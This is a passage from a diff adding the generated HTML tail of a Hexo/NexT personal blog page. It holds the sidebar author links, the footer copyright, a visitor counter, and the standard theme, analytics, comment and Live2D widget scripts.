class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="r0yanx"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">r0yanx</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">36</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ryanInf" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ryanInf" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:ryaninf@outlook.com" title="E-Mail → mailto:ryaninf@outlook.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.freebuf.com/author/r0yanx" title="FreeBuf → https:&#x2F;&#x2F;www.freebuf.com&#x2F;author&#x2F;r0yanx" rel="noopener" target="_blank"><i class="fab fa-fw"></i>FreeBuf</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">r0yanx</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/canvas_sphere.min.js"></script>
+
+
+  
+  <script>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script>
+NexT.utils.loadComments(document.querySelector('#lv-container'), () => {
+  window.livereOptions = {
+    refer: location.pathname.replace(CONFIG.root, '').replace('index.html', '')
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+});
+</script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
